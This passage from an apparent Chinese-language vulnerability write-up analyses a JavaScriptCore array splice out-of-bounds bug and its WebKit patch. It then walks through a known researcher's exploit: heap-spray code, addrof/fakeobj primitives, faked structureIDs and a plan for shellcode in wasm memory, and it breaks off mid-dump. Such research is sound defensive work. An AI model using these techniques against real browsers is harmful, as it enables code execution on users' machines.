<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool JSArray::unshiftCountWithArrayStorage(ExecState* exec, unsigned startIndex, unsigned count, ArrayStorage* storage)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">    &#x2F;&#x2F; If the array contains holes or is otherwise in an abnormal state,</span><br><span class="line">    &#x2F;&#x2F; use the generic algorithm in ArrayPrototype.</span><br><span class="line">    if (storage-&gt;hasHoles() || storage-&gt;inSparseMode() || shouldUseSlowPut(indexingType()))</span><br><span class="line">        return false;</span><br></pre></td></tr></table></figure>

<p>在unshiftCountWithArrayStorage中首先判断了arr的storage是否hasHoles，如果hasHoles为真则使用ArrayPrototype的其他方法去处理splice调用时删除或添加的元素。</p>
<p>​    由于poc中我们修改了arr的length为0xFFFFFFF0，又由于第一次调用splice方法删除元素时在shiftCountWithArrayStorage中不正确地更新了m_numValuesInVector，此时length=m_numValuesInVector=0xFFFFFFF0，storage-&gt;hasHoles()返回为假jsc继续使用unshiftCountWithArrayStorage的方法处理splice调用中添加的元素。此时butterfly(0x7ff0000fe6e8)如下，*(dword*)(&amp;butterfly+0xc)==*(dword*)(&amp;butterfly-0x4)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(JSC::ArrayStorage *)0x7ff0000fe6e8</span><br><span class="line">$4 &#x3D; &#123;</span><br><span class="line">  m_sparseMap &#x3D; &#123;</span><br><span class="line">    &lt;JSC::WriteBarrierBase&lt;JSC::SparseArrayValueMap, WTF::DumbPtrTraits&lt;JSC::SparseArrayValueMap&gt; &gt;&gt; &#x3D; &#123;</span><br><span class="line">      m_cell &#x3D; 0x0</span><br><span class="line">    &#125;, &lt;No data fields&gt;&#125;, </span><br><span class="line">  m_indexBias &#x3D; 0, </span><br><span class="line">  m_numValuesInVector &#x3D; 4294967280, </span><br><span class="line">  m_vector &#x3D; &#123;&#123;</span><br><span class="line">      &lt;JSC::WriteBarrierBase&lt;JSC::Unknown, WTF::DumbValueTraits&lt;JSC::Unknown&gt; &gt;&gt; &#x3D; &#123;</span><br><span class="line">        m_value &#x3D; 0</span><br><span class="line">      &#125;, &lt;No data fields&gt;&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x&#x2F;6xg 0x7ff0000fe6e8-0x10</span><br><span class="line">0x7ff0000fe6d8:	0x00000000badbeef0	0x00000001fffffff0</span><br><span class="line">0x7ff0000fe6e8:	0x0000000000000000	0xfffffff000000000</span><br><span class="line">0x7ff0000fe6f8:	0x0000000000000000	0x00000000badbeef0</span><br></pre></td></tr></table></figure>

<p>​    unshiftCountWithArrayStorage随后设置了storage的gc状态为推迟，然后重新设置了array-&gt;storage。随后的漏洞利用分析中可以看到这里调用memmove处理新的storage就是导致OOB的根本原因。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    WriteBarrier&lt;Unknown&gt;* vector &#x3D; storage-&gt;m_vector;</span><br><span class="line"></span><br><span class="line">    if (startIndex) &#123;</span><br><span class="line">        if (moveFront)</span><br><span class="line">            memmove(vector, vector + count, startIndex * sizeof(JSValue));</span><br><span class="line">        else if (length - startIndex)</span><br><span class="line">            memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) * sizeof(JSValue));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (unsigned i &#x3D; 0; i &lt; count; i++)</span><br><span class="line">        vector[i + startIndex].clear();</span><br><span class="line">    </span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    总结一下漏洞的逻辑：poc中的arr第一次调用splice删除元素时会调用到shiftCountWithArrayStorage，在shiftCountWithArrayStorage会遍历arr的原型链并存在可能使得原型链判断返回假，导致在shiftCountWithArrayStorage中arr的m_numValuesInVector 被不恰当地更新（本不该执行到这里）；在第二次调用splice添加元素时调用到unshiftCountWithArrayStorage，如果设置arr.length=m_numValuesInVector 导致arr-&gt;hasHoles判断为假，进而在unshiftCountWithArrayStorage中使用memmove更新storage时导致OOB。</p>
<h4 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h4><p>​    patch地址<a target="_blank" rel="noopener" href="https://github.com/WebKit/webkit/commit/51a62eb53815863a1bd2dd946d12f383e8695db0">https://github.com/WebKit/webkit/commit/51a62eb53815863a1bd2dd946d12f383e8695db0</a></p>
<p>​    patch中去掉了shiftCountWithArrayStorage中遍历原型链的判断，且不管array是否storage-&gt;hasHoles()都使用memmove去更新storage。这样在调用splice删除元素时只要数组vectorLength!=storageLength即hasHoles为真都会使用ArrayPrototype中的方法去处理，不会更新m_numValuesInVector ，这样这个漏洞就从根源上被修复了。</p>
<p><img src="patch.png" alt="patch"></p>
<p>​    但是这里我没有想明白的一点是为什么修复漏洞之前还要多此一举的调用holesMustForwardToPrototype判断array的原型链，既然不判断既没有漏洞又省去了一次执行判断原型链的时间;)？</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>​    exp来自那个男人，即lokihardt。</p>
<p>​    首先整理一下通过这个漏洞我们可控的东西：splice在删除元素时不正确更新的vectorLength、array数组的长度storageLength，在调用splice添加元素时如果vectorLength=storageLength即storage-&gt;hasHoles为真会执行unshiftCountWithArrayStorage中更新storage的流程，并且更新storage的流程memmove时似乎存在利用的可能。</p>
<p>​    lokihardt的利用思路是通过堆喷利用unshiftCountWithArrayStorage更新storage时memmove修改数组长度构成OOB进而构造addrof、fakeobj原语，构造ArrayWithArrayStorage类型的fakeobj记hax并使hax的butterfly指向ArrayWithDouble类型的victim，通过修改hax[1]即victim.butterfly为addr和victim.prop完成任意地址读写，通过任意地址读写修改wasm模块rwx的内存区来执行shellcode。</p>
<h4 id="heap-spray"><a href="#heap-spray" class="headerlink" title="heap spray"></a>heap spray</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let spray &#x3D; new Array(0x3000);</span><br><span class="line"></span><br><span class="line">for (let i &#x3D; 0; i &lt; 0x3000; i +&#x3D; 2) &#123;</span><br><span class="line">    spray[i]   &#x3D; [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37+i];</span><br><span class="line">    spray[i+1] &#x3D; [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i &#x3D; 0; i &lt; 0x3000; i +&#x3D; 2)</span><br><span class="line">    spray[i][0] &#x3D; i2f(0x1337)</span><br></pre></td></tr></table></figure>

<p>​    lokihardt堆喷的数组spray[i]为ArrayWithDouble,spray[i+1]为ArrayWithContiguous，且spray[i]和spray[i+1]均为10个元素，这里堆喷的数组元素类型和个数都是固定的。</p>
<p>​    首先解释下元素的类型，这里的元素类型是为了方便利用修改长度后的堆喷数组构造fakeobj和addrof原语，测试如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function p(obj)&#123;</span><br><span class="line">	debug(describe(obj));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function b()&#123;</span><br><span class="line">	dbg();	&#x2F;&#x2F;needs patch</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a1 &#x3D; [1.1];</span><br><span class="line">a1[0] &#x3D; 13.37;</span><br><span class="line"></span><br><span class="line">var a2 &#x3D; [&#123;&#125;];</span><br><span class="line"></span><br><span class="line">print(&quot;[*] a1:&quot;);</span><br><span class="line">p(a1);</span><br><span class="line">print(&quot;[*] a2&quot;);</span><br><span class="line">p(a2);</span><br><span class="line">b();</span><br></pre></td></tr></table></figure>

<p>​    a1为ArrayWithDouble类型，jsc中存储如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] a1:</span><br><span class="line">--&gt; Object: 0x7fffb30b4370 with butterfly 0x7fe0000fe928 (Structure 0x7fffb30f2a70:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x7fffb30c80a0, Leaf]), StructureID: 98</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;6xg 0x7fffb30b4370</span><br><span class="line">0x7fffb30b4370:	0x0108210700000062	0x00007fe0000fe928</span><br><span class="line">0x7fffb30b4380:	0x0108210900000063	0x00007fe0000fe948</span><br><span class="line">0x7fffb30b4390:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">pwndbg&gt; x&#x2F;6xg 0x00007fe0000fe928-0x10</span><br><span class="line">0x7fe0000fe918:	0x00007fffb306c280	0x0000000100000001</span><br><span class="line">0x7fe0000fe928:	0x402abd70a3d70a3d	0x00000000badbeef0</span><br><span class="line">0x7fe0000fe938:	0x00000000badbeef0	0x0000000300000001</span><br></pre></td></tr></table></figure>

<p>可以看到a1即ArrayWithDouble的元素在butterfly的storage中直接存储。    </p>
<p>​    a2为ArrayWithContiguous类型，jsc中存储如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[*] a2</span><br><span class="line">--&gt; Object: 0x7fffb30b4380 with butterfly 0x7fe0000fe948 (Structure 0x7fffb30f2ae0:[Array, &#123;&#125;, ArrayWithContiguous, Proto:0x7fffb30c80a0]), StructureID: 99</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;6xg 0x7fffb30b4380</span><br><span class="line">0x7fffb30b4380:	0x0108210900000063	0x00007fe0000fe948</span><br><span class="line">0x7fffb30b4390:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7fffb30b43a0:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">pwndbg&gt; x&#x2F;6xg 0x00007fe0000fe948-0x10</span><br><span class="line">0x7fe0000fe938:	0x00000000badbeef0	0x0000000300000001</span><br><span class="line">0x7fe0000fe948:	0x00007fffb30b0080	0x0000000000000000</span><br><span class="line">0x7fe0000fe958:	0x0000000000000000	0x00000000badbeef0</span><br><span class="line">pwndbg&gt; x&#x2F;6xg 0x00007fffb30b0080-0x10</span><br><span class="line">0x7fffb30b0070:	0x0000000000000004	0x00000000badbeef0</span><br><span class="line">0x7fffb30b0080:	0x010016000000004c	0x0000000000000000</span><br><span class="line">0x7fffb30b0090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>a2中的元素{}在butterfly中以类似object的形式存储，即butterfly中存储的是指向{}内存区的指针，指针指向a2的真正内容。即a2.butterfly-&gt;*p-&gt;content。</p>
<p>​    再看一遍lokihardt堆喷的数组，spray[i]为ArrayWithDouble，butterfly:0x7fe00028c078；spray[i+1]为ArrayWithContiguous，butterfly:0x7fe00028c0e8。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40xg 0x00007fe00028c078-0x40</span><br><span class="line">0x7fe00028c038:	0x00007fffb1a65c40	0x00007fffb1a65c80</span><br><span class="line">0x7fe00028c048:	0x00007fffb1a65cc0	0x0000000000000000</span><br><span class="line">0x7fe00028c058:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fe00028c068:	0x0000000d0000000a	0x0000000000001337</span><br><span class="line">0x7fe00028c078:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c088:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c098:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c0a8:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c0b8:	0x40c735af5c28f5c3	0x7ff8000000000000</span><br><span class="line">0x7fe00028c0c8:	0x7ff8000000000000	0x7ff8000000000000</span><br><span class="line">0x7fe00028c0d8:	0x0000000d0000000a	0x00007fffb1a65d00</span><br><span class="line">0x7fe00028c0e8:	0x00007fffb1a65d40	0x00007fffb1a65d80</span><br><span class="line">0x7fe00028c0f8:	0x00007fffb1a65dc0	0x00007fffb1a65e00</span><br><span class="line">0x7fe00028c108:	0x00007fffb1a65e40	0x00007fffb1a65e80</span><br><span class="line">0x7fe00028c118:	0x00007fffb1a65ec0	0x00007fffb1a65f00</span><br><span class="line">0x7fe00028c128:	0x00007fffb1a65f40	0x0000000000000000</span><br><span class="line">0x7fe00028c138:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fe00028c148:	0x0000000d0000000a	0x0000000000001337</span><br><span class="line">0x7fe00028c158:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c168:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br></pre></td></tr></table></figure>

<p>构造addrof：spray[i+1][0]=obj，jsc会在0x7fe00028c0e8的位置保存obj的地址指针，在**0x7fe00028c0e8的位置保存obj的内容，这样我们通过读spray[i][14]的内容即可实现读对象的地址。</p>
<p>构造fakeobj：spray[i][14]=addr，此时spray[i+1][0]的位置即为addr，由于spray[i+1]为ArrayWithContiguous类型即spray[i+1][x]中保存的是类似obj的对象，这样spray[i+1][0]即为我们构造的fakeobj对象。</p>
<p>​    再解释下堆喷的数组元素个数是10个。要理解堆喷元素个数首先要理解的一点是lokihardt利用的思路，如果我们可以修改堆喷的数组长度使spray[i]可以访问到spray[i+1][xx]就可以构造fakeobj和addrof原语，而正常情况下不修改数组长度spray[i]肯定是不能访问到spray[i+1]的，那么如何修改堆喷数组的长度呢？可能的思路有两个：1.堆喷后手动触发GC调用splice添加元素使调用splice时新添加的storage的butterfly正好落在spray[i]里（即在spray[i]处伪造一个butterfly并修改spray[i]的length），但是这个方法明显的缺陷就是触发GC的时机和新的butterfly太难控制了，控制不当jsc肯定会崩溃；2.调试发现exp中splice添加元素的过程会触发创建新的butterfly的操作，新创建的butterfly会落在最后一个堆喷数组的后面（spray[0x3000].butterfly的后面），配合unshiftCountWithArrayStorage中的memmove可以达到修改堆喷数组长度的效果，这也是这个漏洞为什么会被描述为OOB的根本原因（难道这就是那个男人强大的力量吗;p）。</p>
<p>​    第一次arr.splice(0, 0x11)删除元素时arr的存储</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt; Object: 0x7fffb30b4370 with butterfly 0x7ff0000fe948 (Structure 0x7fffb30f2b50:[Array, &#123;&#125;, ArrayWithArrayStorage, Proto:0x7fffb30c80a0, Leaf]), StructureID: 100</span><br></pre></td></tr></table></figure>

<p>​    堆喷后调用arr.splice(0x1000,0,1)添加元素，unshiftCountWithArrayStorage处理exp中的arr时会调用到unshiftCountSlowCase，并在tryCreateUninitialized中创建新的storage，大小为88=0x58</p>
<p><img src="allocate.png" alt="allocate"></p>
<p>字节对齐后为0x50，为了防止随后的memmove移动内存过程中破坏内存，堆喷的数组元素个数申请了10个。</p>
<p>​    unshiftCountWithArrayStorage在创建完新的storage后会初始化新的storage，即memmove的过程，exp中会执行到以下流程</p>
<p><img src="memmove.png" alt="memmove"></p>
<p>这里dst=0x7ff000287a78即arr新的butterfly+0x10的位置，src=0x7ff000287a80，n=0x8000即将0x7ff000287a80开始0x8000的内存整体前移8字节，这里会使堆喷数组中某个spray[i][0]的元素覆盖到*(dword*)(&amp;spray[i]-8)的位置，即0x1337覆盖到spray[i]的length域</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg 0x7ff000287a78-0x40</span><br><span class="line">0x7ff000287a38:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7ff000287a48:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7ff000287a58:	0x00000000badbeef0	0x00000002fffffff0</span><br><span class="line">0x7ff000287a68:	0x0000000000000000	0xfffffff000000006</span><br><span class="line">0x7ff000287a78:	0x00000000badbeef0	0x0000000000000000</span><br><span class="line">0x7ff000287a88:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7ff000287a98:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7ff000287aa8:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7ff000287ab8:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7ff000287ac8:	0x00000000badbeef0	0x00000000badbeef0</span><br></pre></td></tr></table></figure>

<p>​    被覆盖前的堆喷数组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg 0x7fe00028c078-0x40</span><br><span class="line">0x7fe00028c038:	0x00007fffb1c69c00	0x00007fffb1c69c40</span><br><span class="line">0x7fe00028c048:	0x00007fffb1c69c80	0x00007fffb1c69cc0</span><br><span class="line">0x7fe00028c058:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fe00028c068:	0x0000000000000000	0x0000000d0000000a	&#x2F;&#x2F;length</span><br><span class="line">0x7fe00028c078:	0x0000000000001337	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c088:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c098:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c0a8:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c0b8:	0x402abd70a3d70a3d	0x40c735af5c28f5c3</span><br><span class="line">0x7fe00028c0c8:	0x7ff8000000000000	0x7ff8000000000000</span><br></pre></td></tr></table></figure>

<p>​    被覆盖后的堆喷数组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg 0x7fe00028c078-0x40</span><br><span class="line">0x7fe00028c038:	0x00007fffb1a65c40	0x00007fffb1a65c80</span><br><span class="line">0x7fe00028c048:	0x00007fffb1a65cc0	0x0000000000000000</span><br><span class="line">0x7fe00028c058:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fe00028c068:	0x0000000d0000000a	0x0000000000001337	&#x2F;&#x2F;length</span><br><span class="line">0x7fe00028c078:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c088:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c098:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c0a8:	0x402abd70a3d70a3d	0x402abd70a3d70a3d</span><br><span class="line">0x7fe00028c0b8:	0x40c735af5c28f5c3	0x7ff8000000000000</span><br><span class="line">0x7fe00028c0c8:	0x7ff8000000000000	0x7ff8000000000000</span><br></pre></td></tr></table></figure>

<p>​    到这里我们就可以控制一个可以越界访问的ArrayWithDouble类型数组spray[i]了，通过搜索内存找到length不为0xa的堆喷数组进而可以构造addrof和fakeobj原语。</p>
<h4 id="arbitrary-code-execute"><a href="#arbitrary-code-execute" class="headerlink" title="arbitrary code execute"></a>arbitrary code execute</h4><p>​    lokihardt构造任意地址读写原语的思路是构造一个ArrayWithDouble的数组victim，利用漏洞版本jsc相同数据类型structureID并不会随机化并根据i32和f64在内存中存储位置相同构造fake structureID，构造ArrayWithArrayStorage类型的fakeobj记为hax使hax的butterfly指向victim，通过修改hax[1]即victim的butterfly为addr同时修改victim的prop实现任意地址读写。</p>
<h5 id="fake-structureID"><a href="#fake-structureID" class="headerlink" title="fake structureID"></a>fake structureID</h5><p>​    构造victim</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim &#x3D; [1.1];</span><br><span class="line">victim[0] &#x3D;3.3;</span><br><span class="line">victim[&#39;prop&#39;] &#x3D; 13.37;</span><br><span class="line">victim[&#39;prop&#39;+1] &#x3D; 13.37;</span><br></pre></td></tr></table></figure>

<p>victim = [1.1]此时构造的victim的类型为CopyOnWriteArrayWithDouble，victim[0] =3.3重新分配butterfly并修改victim类型为ArrayWithDouble。jsc中这两种类型并不一样。ArrayWithDouble的victim存储如下，可以看到prop存储在*(dword*)(butterfly-0x10)的位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] victim:</span><br><span class="line">--&gt; Object: 0x7fffb1a551f0 with butterfly 0x7ff000280058 (Structure 0x7fffb3070d90:[Array, &#123;prop:100, prop1:101&#125;, ArrayWithDouble, Proto:0x7fffb30c80a0, Leaf]), StructureID: 318</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;6xg 0x7fffb1a551f0</span><br><span class="line">0x7fffb1a551f0:	0x010821070000013e	0x00007ff000280058</span><br><span class="line">0x7fffb1a55200:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7fffb1a55210:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">pwndbg&gt; x&#x2F;10xg 0x00007ff000280058-0x20</span><br><span class="line">0x7ff000280038:	0x0000000000000000	0x402bbd70a3d70a3d</span><br><span class="line">0x7ff000280048:	0x402bbd70a3d70a3d	0x0000000100000001</span><br><span class="line">0x7ff000280058:	0x400a666666666666	0x00000000badbeef0</span><br><span class="line">0x7ff000280068:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7ff000280078:	0x00000000badbeef0	0x00000000badbeef0</span><br></pre></td></tr></table></figure>

<p>​    构造fakeobj</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i32[0]&#x3D;100;</span><br><span class="line">i32[1]&#x3D;0x01082107 - 0x10000;</span><br><span class="line">var container&#x3D;&#123;</span><br><span class="line">    jscell:f64[0],</span><br><span class="line">    butterfly:victim,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    需要注意在jsc中构造fakeobj时需要绕过structureID，structureID相同的才具有相同methodTable并被jsc视为相同类型。漏洞版本的jsc并不会在每次启动时随机化相同数据类型的structureID，这里lokihardt把structureID初始化为了0x64即arr的ArrayWithArrayStorage类型。这里fakeobj的类型是固定的，构造ArrayWithArrayStorage类型hax的原因是ArrayWithArrayStorage的数据直接存储在butterfly里，我们可以访问到的hax[1]即为victim的butterfly。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] arr:</span><br><span class="line">--&gt; Object: 0x7fffb30b4370 with butterfly 0x7fe0000fe948 (Structure 0x7fffb30f2b50:[Array, &#123;&#125;, ArrayWithArrayStorage, Proto:0x7fffb30c80a0, Leaf]), StructureID: 100</span><br><span class="line"></span><br><span class="line">[*] hax: </span><br><span class="line">--&gt; Object: 0x7fffb30c8390 with butterfly 0x7fffb1a551f0 (Structure 0x7fffb30f2b50:[Array, &#123;&#125;, ArrayWithArrayStorage, Proto:0x7fffb30c80a0, Leaf]), StructureID: 100</span><br></pre></td></tr></table></figure>

<p>​    漏洞版本的jsc在解析如下代码时保存i32和f64内容的位置实际上是相同的（这里我是调试发现的，可能是因为WastefulTypedArray类型？下文有jsc中WastefulTypedArray类型的存储方式解释）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var conversion_buffer &#x3D; new ArrayBuffer(8)</span><br><span class="line">var f64 &#x3D; new Float64Array(conversion_buffer)</span><br><span class="line">var i32 &#x3D; new Uint32Array(conversion_buffer)</span><br></pre></td></tr></table></figure>

<p>存储结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] i32</span><br><span class="line">--&gt; Object: 0x7fffb30c8360 with butterfly 0x7fe0000e0018 (Structure 0x7fffb3070a80:[Uint32Array, &#123;&#125;, NonArray, Proto:0x7fffb30b4360, Leaf]), StructureID: 311</span><br><span class="line">[*] f64</span><br><span class="line">--&gt; Object: 0x7fffb30c8340 with butterfly 0x7fe0000e0008 (Structure 0x7fffb30707e0:[Float64Array, &#123;&#125;, NonArray, Proto:0x7fffb30b4350, Leaf]), StructureID: 305</span><br><span class="line">[*] conversion_buffer:</span><br><span class="line">--&gt; Object: 0x7fffb30c8320 with butterfly (nil) (Structure 0x7fffb30f3640:[ArrayBuffer, &#123;&#125;, NonArray, Proto:0x7fffb30c81e0, Leaf]), StructureID: 125</span><br></pre></td></tr></table></figure>

<p>这里i32和f64的butterfly存储的都不是它们的实际内容，实际存储i32和f64内容的位置位于*(dword*)(i32+0x10)即0x00007fe8000ff000里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg 0x7fffb30c8320</span><br><span class="line">0x7fffb30c8320:	0x010023000000007d	0x0000000000000000</span><br><span class="line">0x7fffb30c8330:	0x00007ffff3a8a600	0x00000000badbeef0</span><br><span class="line">0x7fffb30c8340:	0x01082c0000000131	0x00007fe0000e0008</span><br><span class="line">0x7fffb30c8350:	0x00007fe8000ff000	0x0000000200000001</span><br><span class="line">0x7fffb30c8360:	0x01082a0000000137	